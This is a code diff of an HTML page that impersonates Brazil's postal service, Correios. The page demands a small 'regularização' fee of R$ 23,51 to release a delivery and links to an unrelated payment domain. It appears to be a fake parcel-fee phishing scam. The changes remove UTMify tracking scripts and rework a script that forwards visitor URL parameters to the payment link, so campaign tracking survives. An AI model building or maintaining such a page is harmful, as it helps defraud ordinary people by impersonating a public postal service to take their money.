@@ -15,7 +15,6 @@
     <link rel="stylesheet" href="css/styles.css">
 
     <title>Correios - Envio</title>
-    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
 </head>
 
 <body>
@@ -87,7 +86,7 @@
                 <h1>REGULARIZAÇÃO POR:</h1>
                 <h1 id="value">R$ 23,51</h1>
                 
-                <!-- MODIFICAÇÃO AQUI: Adicionado o id="liberar-entrega-link" -->
+                <!-- O id continua aqui para que o script possa encontrar o link -->
                 <a href="https://pay.ultimo-passo.space/ODAK3LlDoPQ3E6V" id="liberar-entrega-link" style="display:inline-block;padding:15px 25px;background:#1e88e5;color:#fff;border-radius:5px;text-decoration:none;font-size:18px;margin-top:15px;">LIBERAR ENTREGA</a>
                 
                 <p style="margin-top:20px;">
@@ -98,37 +97,27 @@
     </div>
 
     <script src="js/scripts.js"></script>
-    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-    
-    <!-- NOVO SCRIPT ADICIONADO AQUI -->
+
+    <!-- SCRIPT ADICIONADO PARA PASSAR OS PARÂMETROS -->
     <script>
     document.addEventListener("DOMContentLoaded", function() {
-        // Pega a string de consulta completa da URL atual (ex: "?param1=valor1¶m2=valor2")
-        const queryString = window.location.search;
+        // Pega todos os parâmetros da URL da página (ex: "?nome=teste&src=abc")
+        const pageQueryString = window.location.search;
 
-        // Encontra o link pelo ID que adicionamos
+        // Encontra o link de pagamento pelo ID
         const link = document.getElementById('liberar-entrega-link');
 
-        // Verifica se o link e a string de consulta existem
-        if (link && queryString) {
-            // Pega a URL base do link (sem quaisquer parâmetros que ela já possa ter)
-            const baseUrl = link.href.split('?')[0];
+        // Se o link e os parâmetros existirem, faz a mágica
+        if (link && pageQueryString) {
+            // Pega a URL base do link
+            const baseUrl = link.href;
 
-            // Verifica se a URL base já tem um '?' para decidir como concatenar
-            // A maioria dos links de pagamento usa '?' para o primeiro parâmetro e '&' para os seguintes.
-            // Este script simplesmente anexa a string de consulta inteira.
-            link.href = baseUrl + queryString;
+            // Anexa os parâmetros da página ao link de pagamento
+            // Como a URL de pagamento não tem '?', podemos adicionar a string de consulta diretamente
+            link.href = baseUrl + pageQueryString;
         }
     });
     </script>
     
-    <script>
-      window.pixelId = "68252b4a42cbf25c85a8273f";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
 </body>
 </html>
